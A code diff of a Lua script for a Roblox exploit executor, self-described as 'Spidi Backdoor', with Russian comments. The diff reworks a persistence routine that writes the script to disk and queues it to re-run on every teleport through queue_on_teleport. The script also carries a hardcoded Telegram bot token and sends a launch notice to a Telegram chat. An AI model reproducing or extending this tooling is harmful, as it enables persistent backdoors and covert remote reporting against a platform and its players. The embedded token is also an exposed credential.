@@ -7,17 +7,19 @@
   Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
 
--- ==================== АВТО-СОХРАНЕНИЕ СКРИПТА ====================
-local function saveScript()
+-- ==================== АВТО-ЭКСЕКЬЮТ (БЕЗ ГИТХАБА) ====================
+local function setupAutoExecute()
     local writefile = syn and syn.writefile or writefile or fluxus and fluxus.writefile
-    if not writefile then
-        print("[Spidi] ❌ writefile не найден")
-        return false
-    end
+    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
+    local readfile = syn and syn.readfile or readfile or fluxus and fluxus.readfile
     
-    local scriptPath = "SpidiBackdoor.lua"
-    
-    local fullCode = [=[
+    -- Сохраняем скрипт в файл
+    if writefile then
+        local scriptPath = "SpidiBackdoor.lua"
+        
+        -- Проверяем, есть ли уже файл
+        if not readfile or not readfile(scriptPath) then
+            local fullScript = [=[
 --[=[
   d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
  88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
@@ -311,21 +313,15 @@ end)
 wait(3)
 getChat()
 ]=]
-
-    local success, err = pcall(writefile, scriptPath, fullCode)
-    if success then
-        print("[Spidi] ✅ Скрипт сохранён: "..scriptPath)
-        return true
-    else
-        print("[Spidi] ❌ Ошибка сохранения: "..tostring(err))
-        return false
+            
+            writefile(scriptPath, fullScript)
+            print("[Spidi] ✅ Скрипт сохранён: "..scriptPath)
+        else
+            print("[Spidi] ✅ Файл уже существует: "..scriptPath)
+        end
     end
-end
-
--- ==================== АВТО-ЭКСЕКЬЮТ ====================
-local function autoExecute()
-    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
     
+    -- Ставим в очередь для телепортов
     if queueteleport then
         queueteleport("loadfile('SpidiBackdoor.lua')()")
         print("[Spidi] ✅ queue_on_teleport сработал")
@@ -336,28 +332,7 @@ local function autoExecute()
     end
 end
 
--- ==================== ЗАПУСК ====================
-print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi Backdoor")
-print("[Spidi] ========================================")
-
--- Сохраняем скрипт
-saveScript()
-
--- Ставим в очередь
-autoExecute()
-
--- Запускаем основную часть
-loadstring([=[
---[=[
-  d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
- 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
- 88      88    88    88            odD'      88      88    88 88ooo88 
- 88  ooo 88    88    88          .88'        88      88    88 88~~~88 
- 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
-  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
-]=]
-
+-- ==================== ОСНОВНОЙ КОД ====================
 repeat wait() until game:IsLoaded()
 
 local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
@@ -629,16 +604,19 @@ local function createGUI()
     end)
 end
 
-createGUI()
+-- ==================== ЗАПУСК ====================
+print("[Spidi] ========================================")
+print("[Spidi] 🚀 Spidi Backdoor")
+print("[Spidi] ========================================")
 
-Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(function()
-    wait(1)
-    if not Players.LocalPlayer.Character then
-        wait(2)
-        createGUI()
-    end
-end)
+createGUI()
+setupAutoExecute()
 
 wait(3)
 getChat()
-]=])()
+
+if CHAT_ID then
+    send("✅ Spidi Backdoor запущен!\n👤 Hacker228")
+end
+
+print("[Spidi] ✅ Готово!")
